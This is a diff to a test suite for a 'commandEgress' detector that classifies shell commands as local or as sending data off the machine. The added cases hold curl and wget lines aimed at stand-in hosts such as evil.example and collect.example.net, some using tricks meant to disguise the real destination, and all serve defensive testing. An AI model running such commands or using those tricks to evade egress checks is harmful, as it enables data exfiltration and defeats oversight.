@@ -137,6 +137,40 @@ describe('commandEgress', () => {
     expect(egress(command)).toBeNull();
   });
 
+  it.each([
+    'curl -s localhost:4200/__worktree',
+    'curl -I localhost:4200',
+    'curl --silent 127.0.0.1:4200',
+    'curl -s -H "Content-Type: application/json" localhost:4200',
+    'curl -so page.html localhost:4200',
+    'curl -s http://127.1:4200',
+    'cd app && curl -s localhost:4200',
+    'curl -s "http://localhost:4200/api/$NAME"',
+    'for p in a b; do curl -s "http://localhost:4200/$p"; done',
+  ])('a loopback address after a flag that takes no value stays here: %s', (command) => {
+    expect(egress(command)).toBeNull();
+  });
+
+  it.each([
+    ['curl -s evil.example', ['evil.example']],
+    ['curl -s -o localhost:80 https://evil.example', ['evil.example']],
+    ['curl -s "http://$HOST/"', ['?']],
+    ['curl -s "http://localhost:$PORT/"', ['?']],
+    ['curl -s "https://localhost:${P}@evil.example/"', ['?']],
+    ['curl -K localhost', ['?']],
+    ['curl --config=urls.txt http://localhost:3000', ['?']],
+    ['wget -i localhost', ['?']],
+    ['curl -o localhost:80 -s evil.example', ['evil.example']],
+    ['curl -s localhost:4200 --url evil.example', ['evil.example']],
+    ['curl -fsSL localhost:4200 evil.example', ['evil.example']],
+  ])('%s still counts as a send to %j', (command, hosts) => {
+    expect(egress(command)?.hosts).toEqual(hosts);
+  });
+
+  it('keeps ssh -i as a key file, not an address list', () => {
+    expect(egress('ssh -i ~/.ssh/key localhost ls')).toBeNull();
+  });
+
   it('still finds the remote host next to headers and data', () => {
     const command = `curl -H 'Content-Type: application/json' -d "$BODY" https://collect.example.net`;
     expect(egress(command)?.hosts).toEqual(['collect.example.net']);
